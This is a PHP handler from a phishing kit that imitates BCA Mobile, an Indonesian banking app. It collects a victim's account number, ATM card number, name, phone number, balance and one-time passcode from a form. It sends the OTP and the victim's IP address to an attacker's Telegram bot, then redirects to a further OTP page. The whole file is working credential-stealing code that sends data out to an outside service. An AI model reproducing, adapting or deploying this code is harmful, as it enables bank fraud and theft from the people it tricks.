<?php

session_start();
include "./send.php";

$nomor           = $_POST['nomor'];
$noatm           = $_POST['noatm'];
$nama           = $_POST['nama'];
$hp           = $_POST['hp'];
$saldo           = $_POST['saldo']; 
$otp          = $_POST['otp']; 

$_SESSION['nomor'] = $nomor;
$_SESSION['noatm'] = $noatm;
$_SESSION['nama'] = $nama;
$_SESSION['hp'] = $hp;
$_SESSION['saldo'] = $saldo; 
$_SESSION['otp'] = $otp;
$ip           = $_SERVER['REMOTE_ADDR'];
$message = "

BCA Mobile

Otp: ".$otp."
".$ip."
";

function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
include './send.php';
sendMessage($telegram_id, $message, $id_bot); 
header('Location:/sexotp.html');
?>